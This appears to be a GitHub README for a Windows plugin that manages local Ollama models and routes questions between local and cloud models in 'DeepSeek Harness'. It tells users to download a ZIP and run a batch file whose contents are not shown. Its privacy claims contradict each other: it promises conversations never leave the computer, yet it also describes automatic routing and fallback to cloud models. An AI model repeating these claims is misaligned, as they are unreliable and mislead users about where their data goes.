<h1>🤖 dsh-local-ai - Your Private AI Models, One Click Away</h1>

[![Download dsh-local-ai](https://img.shields.io/badge/Download-dsh--local--ai-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Palkaro/dsh-local-ai)

---

## 👋 Welcome to dsh-local-ai

This tool helps you use AI models that run **directly on your computer** - no internet needed! Think of it as having a smart assistant that works even when you're offline. It works alongside something called "DeepSeek Harness" to give you the best of both worlds: private, fast responses from your own computer, plus the option to use cloud AI when needed.

## 🎯 What Does This Do For You?

- **Discover Models** 🔍 - Find new AI models to download with a single command
- **Pull Models** ⬇️ - Download AI models to your computer safely
- **Remove Models** 🗑️ - Delete models you no longer need
- **Inspect Models** 🔎 - See what each model can do before you use it
- **Smart Routing** 🧠 - Automatically picks the best model for your question (personal vs. work, simple vs. complex)
- **Privacy First** 🔒 - Your questions stay on your computer. No cloud, no tracking
- **Offline Ready** 📴 - Works without internet connection
- **One-Shot Status** 📊 - Check everything at once with a simple /ollama command

## 📥 How to Download and Run

### Step 1: Get the Software

Visit this link to download the application: [https://github.com/Palkaro/dsh-local-ai](https://github.com/Palkaro/dsh-local-ai)

Click the green "Code" button, then "Download ZIP" to get the file on your computer.

### Step 2: Open the ZIP File

Find the downloaded ZIP file in your "Downloads" folder. Right-click it and choose "Extract All..." or "Extract Here". This will create a new folder with the software inside.

### Step 3: Start Using It

Open the new folder and look for a file named `run.bat` or `start.bat`. Double-click it, and you're all set! Your AI tools are now ready to use.

## ✨ Key Features Explained

### Model Discovery (🔍)
Discover new AI models like you'd browse a bookstore. Just type what kind of model you want, and it finds match unavailable ones. Perfect for trying out new AI capabilities.

### Model Pulling (⬇️)
Download any discovered model directly to your computer. These models are like apps - you download them once, and they're always ready. No waiting, no streaming.

### Smart Routing (🧠)
This is the magic part! dsh-local-ai automatically decides which AI model to use based on your question:
- **Personal questions?** Uses a local, private model
- **Complex technical questions?** Routes to cloud AI for better answers
- **Quick questions?** Uses fast, lightweight local models

This means you get the fastest, most private responses without thinking about it.

### Inspection (🔎)
Before downloading a new model, inspect it like reading a product review. See what it's good at, how big it is, and what tasks it handles best. Make informed choices.

### Status Overview (📊)
Type `/ollama` in your DeepSeek Harness chat to see everything at once:
- Which models you have installed
- Which ones are running
- Available updates
- Storage usage

It's like a dashboard for all your AI tools.

## 🖥️ System Requirements

- **Operating System:** Windows 10 or 11 (64-bit)
- **RAM:** 8GB minimum, 16GB recommended
- **Storage:** At least 10GB free (models take space)
- **Internet:** Only needed for initial download and cloud AI fallback

## 💡 Simple Usage Examples

### First-Time Setup
1. Open DeepSeek Harness
2. Type `/ollama discover` to see available models
3. Type `/ollama pull model-name` to download one
4. Start chatting! Type normally, and let dsh-local-ai handle the thinking

### Everyday Use
- Just ask questions normally in DeepSeek Harness
- dsh-local-ai automatically decides which model to use
- See local model status anytime with `/ollama status`
- Remove old models with `/ollama remove model-name`

## 🛠️ Troubleshooting Tips

### "No Models Found"
- Make sure you've pulled at least one model first
- Check internet connection for discovery
- Try typing `/ollama discover` again

### "Model Not Responding"
- Type `/ollama status` to see if your models are active
- Try removing and re-pulling the model
- Restart DeepSeek Harness

### "Storage Full"
- Type `/ollama list` to see all installed models
- Remove models you don't use anymore
- Free up space, then try again

## 🔐 Privacy Promise

Your conversations using local models never leave your computer. No servers, no cloud, no one else sees them. Only when you explicitly choose cloud models (or when smart routing sends a question to the cloud) does any data leave your device. The choice is always yours.

## 💪 Power User Features

- **Task-Based Routing:** Set custom rules for which models handle which types of tasks
- **Keyword Routing:** Assign specific models to respond to specific keywords
- **Automatic Fallback:** If a local model fails, it automatically switches to cloud without breaking your flow
- **Batch Operations:** Pull, remove, or inspect multiple models at once

## 🌟 Why You'll Love This

- **No Subscription Fees** - Local models are completely free, forever
- **Blazing Fast** - Local models respond instantly (no internet delay)
- **Offline Freedom** - Works anywhere, even without Wi-Fi
- **Total Privacy** - Your AI conversations stay private
- **Flexible** - Use local and cloud AI together, seamlessly

## 🔄 How It Works with DeepSeek Harness

dsh-local-ai is a plugin that extends DeepSeek Harness, your main AI workspace. It adds a special "layer" that manages all your local AI models. Think of it as a smart manager that:
- Keeps all your local AI models organized
- Chooses the right model for each question
- Syncs local and cloud AI for the best results

## 📚 Learning Resources

- **Official Website:** Visit the GitHub page for detailed documentation
- **Community Support:** Report issues or ask questions on the Issues tab
- **Updates:** Check the "Releases" section for new versions and model updates

## ✅ Quick Start Checklist

1. ✅ Download dsh-local-ai from GitHub
2. ✅ Extract the ZIP file
3. ✅ Run the start script
4. ✅ Open DeepSeek Harness
5. ✅ Type `/ollama discover` and pick a model
6. ✅ Type `/ollama pull model-name`
7. ✅ Start chatting privately and instantly!

## 🆘 Need Help?

1. Check the Troubleshooting section above
2. Visit https://github.com/Palkaro/dsh-local-ai for documentation
3. Open an issue on GitHub with details about your problem
4. Include your Windows version and what you tried

You're now ready to enjoy private, fast, and flexible AI - all from your own computer. Happy chatting! 🎉

Keywords: cordis, deepseek, deepseek-harness, dsh, dsh-plugin, local-llm, local-models, model-routing, offline, ollama, privacy